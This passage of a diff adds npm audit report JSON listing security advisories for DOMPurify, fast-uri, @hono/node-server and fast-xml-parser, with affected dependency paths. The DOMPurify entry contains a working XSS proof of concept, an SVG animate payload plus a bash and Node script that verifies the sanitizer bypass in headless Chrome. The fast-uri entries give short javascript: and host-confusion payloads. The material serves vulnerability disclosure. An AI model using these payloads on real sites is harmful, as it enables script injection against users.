'application/xhtml+xml', USE_PROFILES: { svg: true }, ADD_TAGS: ['animate'], ADD_ATTR: ['attributeName'] }` behaves the same.\n\nInput:\n\n```html\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>\n```\n\nSteps:\n\n1. Save this as `poc.xhtml` next to `purify.js` (3.4.16) and open it in Chrome. The `.xhtml` extension makes Chrome load it as application/xhtml+xml, so nothing moves between HTML and XHTML.\n\n```html\n<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>\n<script src=\"purify.js\"></script></head><body><div id=\"sink\"></div>\n<script>//<![CDATA[\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\nconst dirty = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nconst clean = DOMPurify.sanitize(dirty, cfg);\nconsole.log(clean);\ndocument.getElementById('sink').innerHTML = clean;\n//]]></script></body></html>\n```\n\n2. The logged output still contains `attributeName=\"href\"` and `values=\"x;javascript:alert(1)\"`.\n3. `document.getElementById('q').href.animVal` returns `\"javascript:alert(1)\"`.\n4. Click \"click\" and `alert(1)` runs.\n\nAs a control, remove `PARSER_MEDIA_TYPE` and change the allowlist entry to `attributename`. The output then loses `attributeName`, `href.animVal` is `\"\"`, and clicking does nothing. The same XHTML-mode output also runs when inserted into a normal text/html page.\n\nAn automated version (fetches a given version from npm, clicks via CDP, checks for the dialog, runs the control) is below.\n\n<details>\n<summary>poc.sh</summary>\n\n```bash\n#!/usr/bin/env bash\n# PoC: DOMPurify SMIL attributeName=href guard bypass in XHTML parser mode.\n#\n# Sanitizes an SVG payload with a PARSER_MEDIA_TYPE:\"application/xhtml+xml\"\n# config that allow-lists <animate> + attributeName, renders the output into\n# div.innerHTML in headless Chromium, clicks the link with a trusted (CDP) mouse\n# event and reports whether alert() fired. Also runs the same allowlist in\n# text/html mode as a control (DOMPurify strips attributeName there).\n#\n# usage:  ./poc.sh [dompurify-version]          (default 3.4.16, fetched via `npm pack`)\n#         DOMPURIFY_JS=/path/to/purify.js ./poc.sh\n#         CHROME=/path/to/chrome ./poc.sh\n# needs:  node >= 18, npm (unless DOMPURIFY_JS is set), a Chromium/Chrome binary.\n# exit:   0 = vulnerable (alert fired in xhtml mode), 1 = not vulnerable, 2 = setup error\nset -euo pipefail\nVER=\"${1:-3.4.16}\"\nWORK=\"$(mktemp -d)\"\ntrap 'rm -rf \"$WORK\"' EXIT\n\nif [ -z \"${DOMPURIFY_JS:-}\" ]; then\n  (cd \"$WORK\" && npm pack \"dompurify@$VER\" --silent >/dev/null 2>&1 && tar xzf dompurify-*.tgz) || { echo \"npm pack dompurify@$VER failed\" >&2; exit 2; }\n  DOMPURIFY_JS=\"$WORK/package/dist/purify.js\"\nfi\nif [ -z \"${CHROME:-}\" ]; then\n  for c in \"$HOME\"/.cache/ms-playwright/chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell \\\n           \"$HOME\"/.cache/ms-playwright/chromium-*/chrome-linux/chrome \\\n           \"$(command -v google-chrome || true)\" \"$(command -v chromium || true)\" \"$(command -v chromium-browser || true)\"; do\n    [ -n \"$c\" ] && [ -x \"$c\" ] && CHROME=\"$c\" && break\n  done\nfi\n[ -n \"${CHROME:-}\" ] || { echo \"no Chrome/Chromium found; set CHROME=\" >&2; exit 2; }\n\ncat > \"$WORK/poc.html\" <<'EOF'\n<!doctype html><meta charset=\"utf-8\"><title>poc</title>\n<script src=\"purify.js\"></script>\n<div id=\"sink\"></div>\n<script>//<![CDATA[\nconst payload = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\">' +\n  '<a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/>' +\n  '<text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nfunction run(mode) {\n  const cfg = {\n    ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n    ALLOWED_ATTR: [mode === 'xhtml' ? 'attributeName' : 'attributename', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n  };\n  if (mode === 'xhtml') cfg.PARSER_MEDIA_TYPE = 'application/xhtml+xml';\n  const clean = DOMPurify.sanitize(payload, cfg);\n  document.getElementById('sink').innerHTML = clean;\n  return clean;\n}\n//]]></script>\nEOF\ncp \"$DOMPURIFY_JS\" \"$WORK/purify.js\"\n# Same test inside a real XHTML document (no HTML<->XHTML context flip):\n# the page is parsed as application/xhtml+xml and the sink's innerHTML uses the XML fragment parser.\nsed -e 's#<!doctype html><meta charset=\"utf-8\"><title>poc</title>#<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>#' \\\n    -e 's#<script src=\"purify.js\"></script>#<script src=\"purify.js\"></script></head><body>#' \\\n    -e 's#^</script>$#</script></body></html>#' \"$WORK/poc.html\" > \"$WORK/poc.xhtml\"\n\ncat > \"$WORK/drive.js\" <<'EOF'\n// zero-dependency CDP driver over --remote-debugging-pipe\nconst { spawn } = require('child_process');\nconst [chrome, url, dir] = process.argv.slice(2);\nconst xurl = url.replace(/\\.html$/, '.xhtml');\nconst p = spawn(chrome, ['--headless', '--no-sandbox', '--remote-debugging-pipe', '--disable-gpu', '--no-first-run',\n  `--user-data-dir=${dir}/profile`, 'about:blank'], { stdio: ['ignore', 'ignore', 'ignore', 'pipe', 'pipe'] });\nlet id = 0, buf = ''; const pend = new Map(), dialogs = [];\np.stdio[4].on('data', (d) => {\n  buf += d; let i;\n  while ((i = buf.indexOf('\\0')) >= 0) {\n    const m = JSON.parse(buf.slice(0, i)); buf = buf.slice(i + 1);\n    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }\n    else if (m.method === 'Page.javascriptDialogOpening') {\n      dialogs.push(m.params.message);\n      send('Page.handleJavaScriptDialog', { accept: true }, m.sessionId);\n    }\n  }\n});\nfunction send(method, params = {}, sessionId) {\n  return new Promise((r) => { const n = ++id; pend.set(n, r); p.stdio[3].write(JSON.stringify({ id: n, method, params, sessionId }) + '\\0'); });\n}\nconst sleep = (ms) => new Promise((r) => setTimeout(r, ms));\n(async () => {\n  const { result: { targetId } } = await send('Target.createTarget', { url: 'about:blank' });\n  const { result: { sessionId: s } } = await send('Target.attachToTarget', { targetId, flatten: true });\n  await send('Page.enable', {}, s); await send('Runtime.enable', {}, s);\n  const ev = async (e) => (await send('Runtime.evaluate', { expression: e, returnByValue: true, awaitPromise: true }, s)).result.result.value;\n  let vulnerable = false, xhtmlDoc = false;\n  const ver = async () => ev('DOMPurify.version');\n  for (const [mode, page] of [['html', url], ['xhtml', url], ['xhtml', xurl]]) {\n    await send('Page.navigate', { url: page }, s); await sleep(500);\n    const docType = await ev('document.contentType');\n    if (mode === 'html') console.log('DOMPurify', await ver(), '/', await ev('navigator.userAgent.match(/Chrome\\\\/[\\\\d.]+/)[0]'));\n    dialogs.length = 0;\n    const clean = await ev(`run(${JSON.stringify(mode)})`);\n    await sleep(400); // let the 0.01s animation apply (fill=freeze)\n    const href = await ev(`(()=>{const a=document.getElementById('q');return a?a.href.animVal:null})()`);\n    const box = await ev(`(()=>{const t=document.querySelector('#sink text');if(!t)return null;const r=t.getBoundingClientRect();return [r.x+r.width/2,r.y+r.height/2]})()`);\n    if (box) for (const type of ['mouseMoved', 'mousePressed', 'mouseReleased'])\n      await send('Input.dispatchMouseEvent', { type, x: box[0], y: box[1], button: 'left', clickCount: 1 }, s);\n    await sleep(800);\n    console.log(`\\n[${mode} mode, sink document ${docType}] sanitized output:\\n  ${clean}`);\n    console.log(`  animated <a> href (animVal): ${JSON.stringify(href)}`);\n    console.log(`  alert() fired on click: ${dialogs.length ? 'YES ' + JSON.stringify(dialogs) : 'no'}`);\n    if (mode === 'xhtml' && dialogs.length) vulnerable = true;\n    if (mode === 'xhtml' && docType === 'application/xhtml+xml') xhtmlDoc = dialogs.length > 0;\n  }\n  console.log(vulnerable ? `\\nRESULT: VULNERABLE (javascript: executed in XHTML mode; pure-XHTML document sink: ${xhtmlDoc ? 'also executes' : 'no'})` : '\\nRESULT: not vulnerable');\n  p.kill('SIGKILL'); process.exit(vulnerable ? 0 : 1);\n})().catch((e) => { console.error(e); p.kill('SIGKILL'); process.exit(2); });\nEOF\nnode \"$WORK/drive.js\" \"$CHROME\" \"file://$WORK/poc.html\" \"$WORK\"\n```\n\n</details>\n\n### Impact\n\nStored or reflected XSS on a click. It affects apps that sanitize SVG in XHTML mode and allow `animate` (or `set`) with `attributeName`, for example to keep simple SVG animations. Script runs in the app's origin when a user clicks the sanitized link. Default configs and text/html mode aren't affected.",
+      "reported_by": null,
+      "title": "DOMPurify: SMIL attributeName=href guard is skipped when PARSER_MEDIA_TYPE is application/xhtml+xml",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<=3.4.16",
+      "github_advisory_id": "GHSA-c6gr-qvv4-5v3f",
+      "recommendation": "Upgrade to version 3.4.17 or later",
+      "patched_versions": ">=3.4.17",
+      "updated": "2026-10-22T16:24:24.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-c6gr-qvv4-5v3f"
+    },
+    "1243098": {
+      "findings": [
+        {
+          "version": "3.1.8",
+          "paths": [
+            ". > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8",
+            ". > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\api > @modelcontextprotocol/sdk@1.32.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\api > @modelcontextprotocol/sdk@1.32.1 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\api > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\worker > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-w74x-v6f9-j3xg\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110306\n- https://github.com/fastify/fast-uri/commit/39933a1f1422986f14e2d844f552238feb40f5d4\n- https://github.com/fastify/fast-uri/commit/597f254c86d151568511eeb9a1df761fd12520b3\n- https://github.com/fastify/fast-uri/commit/e60e716f41d1d73717e2d803d20b68d2c6d20a0f\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-w74x-v6f9-j3xg",
+      "created": "2026-10-23T21:41:36.000Z",
+      "id": 1243098,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` percent-decodes the scheme component with the legacy global `unescape()` before validating it, so an input whose decoded scheme is a valid but dangerous token is emitted as a live scheme. RFC 3986 section 3.1 does not allow percent-encoding in a scheme, so no RFC or WHATWG parser treats such input as having that scheme, but `fast-uri` does.\n\nFor example, `normalize('%6Aavascript:alert(1)')` returns `javascript:alert(1)`, `resolve('https://a.example/', '%6Aavascript:alert(1)')` returns `javascript:alert(1)`, and `parse('%6Aavascript:alert(1)').scheme` returns `javascript`. The `%uXXXX` form (`%u006Aavascript:`) produces the same result, and `equal('%68ttp://a/', 'http://a/')` returns `true`.\n\nAn application that screens dangerous schemes on the raw input and then stores or renders `normalize(input)` or `resolve(base, input)` turns an inert string into an executable `javascript:`, `data:`, or `vbscript:` URL, a stored or reflected cross-site scripting vector in the consuming application. `equal()` also treats an encoded and a plain scheme as the same, which can bypass equality-based allowlists.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nReject input whose scheme part (before the first `:`, and before any `/`, `?`, or `#`) contains `%`. Alternatively, check `parse(x).scheme` against an allowlist after normalization and use that same parsed result rather than the raw string.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to URI scheme spoofing via percent-encoded scheme decoding",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110306"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.9",
+      "github_advisory_id": "GHSA-w74x-v6f9-j3xg",
+      "recommendation": "Upgrade to version 3.1.9 or later",
+      "patched_versions": ">=3.1.9",
+      "updated": "2026-10-23T21:41:38.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-172",
+        "CWE-180"
+      ],
+      "url": "https://github.com/advisories/GHSA-w74x-v6f9-j3xg"
+    },
+    "1243101": {
+      "findings": [
+        {
+          "version": "3.1.8",
+          "paths": [
+            ". > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8",
+            ". > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\api > @modelcontextprotocol/sdk@1.32.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\api > @modelcontextprotocol/sdk@1.32.1 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\api > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\worker > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-xhq7-xmqj-769h\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110095\n- https://github.com/fastify/fast-uri/commit/048bbd0a252971be86d6579f0dfc87f8de5b9c47\n- https://github.com/fastify/fast-uri/commit/52774a5c35df36b0bbe439cd4c12c3dc0e50e3b9\n- https://github.com/fastify/fast-uri/commit/7c19f8b97ec51f1f20b4e3d9d5820cb8d5176058\n- https://github.com/fastify/fast-uri/commit/9eb8759a9825c046f57f7f695f1944bc39b88abd\n- https://github.com/fastify/fast-uri/commit/acc5c5d60c4209571789496e1732468911c7e12a\n- https://github.com/fastify/fast-uri/commit/b110a3571c37dfcf9d1c72ce2e2e178c78d1a424\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-xhq7-xmqj-769h",
+      "created": "2026-10-23T21:39:34.000Z",
+      "id": 1243101,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri`'s `normalize()` and `serialize()` apply RFC 3986 dot-segment removal (`remove_dot_segments`) to the path of a relative-path reference. RFC 3986 section 5.2.4 defines that algorithm only for the merged target path during resolution, not for the reference itself, so applied to the reference it drops leading `..` segments and can turn a document-relative reference into a root-relative one.\n\nFor example, `normalize('a/../b')` returns `/b` and `normalize('../x')` returns `x`, so `resolve(base, normalize(ref))` points at a different resource than `resolve(base, ref)`, and `equal()` treats distinct references as the same.\n\nApplications that normalize attacker-supplied or user-supplied relative references and then resolve them, or use them as cache, deduplication, or authorization keys, can have a reference escape its intended directory and point at a different resource.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nDo not normalize a relative reference before resolving it. Resolve it against the absolute base first, then normalize the absolute result.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to improper path equivalence in relative reference normalization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110095"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.9",
+      "github_advisory_id": "GHSA-xhq7-xmqj-769h",
+      "recommendation": "Upgrade to version 3.1.9 or later",
+      "patched_versions": ">=3.1.9",
+      "updated": "2026-10-23T21:39:38.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-41"
+      ],
+      "url": "https://github.com/advisories/GHSA-xhq7-xmqj-769h"
+    },
+    "1243104": {
+      "findings": [
+        {
+          "version": "3.1.8",
+          "paths": [
+            ". > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8",
+            ". > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\api > @modelcontextprotocol/sdk@1.32.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\api > @modelcontextprotocol/sdk@1.32.1 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\api > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\worker > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-wjr9-j795-jxcr\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110180\n- https://github.com/fastify/fast-uri/commit/58c183d0b168ad87f98773266444ce1f6375803a\n- https://github.com/fastify/fast-uri/commit/ddfc6a51122dfce0365655f04479fc3adb7f6b3c\n- https://github.com/fastify/fast-uri/commit/f6d46dfeab025d0c440485f4ae29fa4f14707646\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-wjr9-j795-jxcr",
+      "created": "2026-10-23T21:37:59.000Z",
+      "id": 1243104,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` versions `>= 2.4.2, <= 2.4.7`, `>= 3.1.3, <= 3.1.8`, and `>= 4.0.1, <= 4.2.2` can silently rewrite the host of an HTTP-family URL (`http`, `https`, `ws`, `wss`, or any scheme with `domainHost: true`). For those schemes `canonicalizeHost()` passes the parsed host to the WHATWG `URL` parser and adopts its `.hostname` without checking that the parser read the whole input as a host. RFC 3986 permits `@` inside the host group and the WHATWG parser strips TAB, LF, and CR, so the authority `fast-uri` reports is rewritten by that second parser with no `error` set: data before an `@` is dropped and whitespace is removed.\n\nFor example, `fast-uri` parses `http://a@b@evil.example/` to host `evil.example` (dropping the `b` segment), and a host containing a raw TAB, CR, or LF has those characters stripped. `equal()` then treats a whitespace-smuggled host as the same as the clean one, and `resolve()` rewrites the authority the same way.\n\nApplications that use `fast-uri` to enforce host-based policy (denylists, loopback filtering, redirect validation, outbound proxy routing) on one representation, such as the raw input, see a policy/use desync: the canonical host `fast-uri` returns differs from what was checked, and traffic can be steered to an unintended destination.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nReject URIs whose authority contains more than one `@`, or contains TAB, CR, or LF, before calling `fast-uri`. Alternatively, treat any non-empty `parse(x).error` as fatal, and compare hosts only from the same `parse()` result.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to host confusion via unchecked WHATWG host canonicalization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110180"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.1.3 <3.1.9",
+      "github_advisory_id": "GHSA-wjr9-j795-jxcr",
+      "recommendation": "Upgrade to version 3.1.9 or later",
+      "patched_versions": ">=3.1.9",
+      "updated": "2026-10-23T21:38:02.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-wjr9-j795-jxcr"
+    },
+    "1243107": {
+      "findings": [
+        {
+          "version": "3.1.8",
+          "paths": [
+            ". > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8",
+            ". > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\api > @modelcontextprotocol/sdk@1.32.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\api > @modelcontextprotocol/sdk@1.32.1 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\api > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8",
+            "apps\\worker > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @prisma/streams-local@0.1.2 > ajv@8.20.0 > fast-uri@3.1.8"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-333x-w4r6-6crp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110725\n- https://github.com/fastify/fast-uri/commit/39e6493c1356f30a0084171627eb266786e1620e\n- https://github.com/fastify/fast-uri/commit/a9b8d67353630aab053cd727cf629023dd018d2b\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-333x-w4r6-6crp",
+      "created": "2026-10-23T21:36:40.000Z",
+      "id": 1243107,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri`'s `serialize()`, `normalize()`, and `resolve()`, when called with the non-default option `reference: 'suffix'` on a reference that has no authority, emit a relative reference whose first path segment contains a bare colon without escaping it. RFC 3986 section 3.3 requires the first segment of a `path-noscheme` reference not to contain a colon, precisely because a bare colon makes the string reparse as an absolute URI with a scheme. `fast-uri`'s default serialization escapes that colon, but the suffix path does not.\n\nFor example, `normalize('javascript:alert(1)', { reference: 'suffix' })` returns `javascript:alert(1)`, which reparses as a live `javascript:` scheme; `data:` and `vbscript:` behave the same.\n\nApplications that serialize or normalize a relative reference with `reference: 'suffix'` and then treat the result as a URI can turn inert input into a live `javascript:`, `data:`, or `vbscript:` URL (a cross-site scripting vector), and `equal()` can conflate a scheme-bearing reference with a relative one. Exposure is limited to applications that use the non-default `reference: 'suffix'` option.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nDo not use the `reference: 'suffix'` option on untrusted input. If suffix output is required, percent-encode a colon in the first path segment of the result before treating it as a URI.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to scheme injection via an unescaped first-segment colon in suffix references",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110725"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.9",
+      "github_advisory_id": "GHSA-333x-w4r6-6crp",
+      "recommendation": "Upgrade to version 3.1.9 or later",
+      "patched_versions": ">=3.1.9",
+      "updated": "2026-10-23T21:36:41.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-41",
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-333x-w4r6-6crp"
+    },
+    "1243661": {
+      "findings": [
+        {
+          "version": "1.19.18",
+          "paths": [
+            ". > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @hono/node-server@1.19.18",
+            ". > prisma@7.8.0 > @prisma/dev@0.24.3 > @hono/node-server@1.19.18",
+            "apps\\api > @modelcontextprotocol/sdk@1.32.1 > @hono/node-server@1.19.18",
+            "apps\\api > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @hono/node-server@1.19.18",
+            "apps\\worker > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/dev@0.24.3 > @hono/node-server@1.19.18"
+          ]
+        },
+        {
+          "version": "1.19.19",
+          "paths": [
+            "apps\\api > @hono/node-server@1.19.19"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/node-server/security/advisories/GHSA-rmxm-3fg6-px4f\n- https://github.com/honojs/node-server/commit/982179278529d5673812116b042829f27794966f\n- https://github.com/honojs/node-server/releases/tag/v2.1.3\n- https://github.com/advisories/GHSA-rmxm-3fg6-px4f",
+      "created": "2026-10-28T21:05:00.000Z",
+      "id": 1243661,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`serveStatic` decodes the request path a second time after Hono has already decoded it for routing. A crafted request can be routed as one path and served as another, so middleware mounted on a static prefix does not run for a file under that prefix.\n\n### Details\n\nHono decodes the request path once before routing. `serveStatic` decoded it again before resolving the file. With a malformed percent-encoded sequence, the first decode leaves part of the path encoded, the router matches the encoded form, and the second decode resolves the real directory. The file is still resolved inside the configured root; this is not a traversal outside it.\n\n### Impact\n\nAn unauthenticated attacker may reach static files without the middleware on their prefix running, for example an authentication check. This affects applications that mount middleware on part of the directory served by `serveStatic`. Applications that serve only public files are not affected.",
+      "reported_by": null,
+      "title": "@hono/node-server: `serveStatic` decodes the request path a second time, leading to bypass of middleware on static paths",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118663"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@hono/node-server",
+      "vulnerable_versions": ">=1.19.10 <2.1.3",
+      "github_advisory_id": "GHSA-rmxm-3fg6-px4f",
+      "recommendation": "Upgrade to version 2.1.3 or later",
+      "patched_versions": ">=2.1.3",
+      "updated": "2026-10-28T21:05:02.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-174"
+      ],
+      "url": "https://github.com/advisories/GHSA-rmxm-3fg6-px4f"
+    },
+    "1246029": {
+      "findings": [
+        {
+          "version": "5.11.1",
+          "paths": [
+            "apps\\api > fast-xml-parser@5.11.1",
+            "apps\\api > firebase-admin@13.10.0 > @google-cloud/storage@7.22.0 > fast-xml-parser@5.11.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-474x-hrwr-fgx4\n- https://github.com/NaturalIntelligence/fast-xml-parser/commit/0c3659348364959da62954b73728fb3bd05ebcb4\n- https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.12.0\n- https://github.com/advisories/GHSA-474x-hrwr-fgx4",
+      "created": "2026-11-10T21:09:44.000Z",
+      "id": 1246029,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nWith the non-default stopNodes option, a stop node's body with many \"<a \" fragments and no closing \">\" anywhere after makes readStopNodeData() rescan the entire remaining input from every \"<\". The failed lookahead is neither cached nor bounded, so n fragments cost O(n²) before the parser throws. Availability-only (CPU exhaustion), needs the non-default stopNodes option — not benchmarked yet, see Proof of Concept.\n\n### Details\n\n**CWE-407** — Inefficient Algorithmic Complexity\n\n**Code**\n- `OrderedObjParser.js:520` — `parseXml()` calls `readStopNodeData()` after a matching stop node opens\n- `OrderedObjParser.js:810` — calls `readTagExp()` for every non-special `<`\n- `OrderedObjParser.js:688-722` — `tagExpWithClosingIndex()` scans to end-of-input and returns `undefined` when no `>` exists\n- `OrderedObjParser.js:812-818` — on failure, `i` isn't advanced, so the next `<` repeats the same full scan\n- `OrderedObjParser.js:423` — the main parse loop throws immediately on the same failure; only the stop-node path retries\n\n**Root cause:** a failed closing-`>` lookahead is neither cached nor bounded — `n` copies of `<a ` with no later `>` means `n` scans over the 